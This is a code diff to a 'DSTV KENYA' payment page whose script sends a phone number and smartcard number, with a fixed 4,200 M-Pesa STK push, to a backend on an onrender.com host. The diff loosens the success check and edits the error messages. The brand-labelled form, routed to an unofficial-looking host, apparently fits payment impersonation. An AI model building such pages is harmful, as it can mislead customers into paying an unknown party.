@@ -13,7 +13,7 @@
   content="default-src 'none'; connect-src 'self' https://dstv-kenya.onrender.com; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:; form-action 'none'; base-uri 'none';"
 ></head>
  <body>
-  <script>
+<script>
 document.addEventListener("DOMContentLoaded", function () {
   const form = document.getElementById("vendorFieldsForm");
   
@@ -59,7 +59,7 @@ document.addEventListener("DOMContentLoaded", function () {
     const originalButtonText = button.innerText;
     button.innerText = "M-Pesa Processing...15 sec";
 
-    // AbortController setup with a 60-second window for cold boots
+    // AbortController setup with a 60-second window for Render cold starts
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 60000);
 
@@ -74,27 +74,38 @@ document.addEventListener("DOMContentLoaded", function () {
         body: JSON.stringify({ 
           phone: phone, 
           amount: 4200, 
-          smartcard: smartcard 
+          description: `Smartcard #${smartcard}` 
         })
       });
 
       clearTimeout(timeoutId);
       const data = await response.json();
 
-      if (response.ok) {
-        alert("STK Push sent successfully! Check your phone. ~DSTV KENYA");
+      console.log("Backend Response Received:", data);
+
+      // FLEXIBLE SUCCESS CHECK:
+      // Checks for data.success, data.status === 'success', or nested Paynexus data properties
+      const isSuccess = data.success === true || 
+                        data.status === 'success' || 
+                        data.ResponseCode === "0" ||
+                        (data.data && (data.data.status === 'initiated' || data.data.checkout_request_id));
+
+      if (isSuccess) {
+        alert("STK Push sent successfully! Check your phone to complete payment. ~DSTV KENYA");
       } else {
-        const errorMsg = data.message || data.error || data.detail || "Failed to initiate payment.";
+        // Only show error if no successful prompt markers exist
+        const errorMsg = data.message || data.error || (data.details && data.details.message) || "Failed to initiate payment.";
         alert("Payment Error: " + errorMsg);
       }
+
     } catch (err) {
       clearTimeout(timeoutId);
       console.error("Fetch Failure Details:", err);
 
       if (err.name === 'AbortError') {
-        alert("Server request timed out. The backend took too long to wake up—please try clicking Continue again.");
+        alert("Server request timed out. Render backend is warming up—please click Continue again.");
       } else {
-        alert("Network Connection Error. Check your browser console (F12) for details.");
+        alert("Network Connection Error. Please check your internet connection.");
       }
     } finally {
       button.disabled = false;
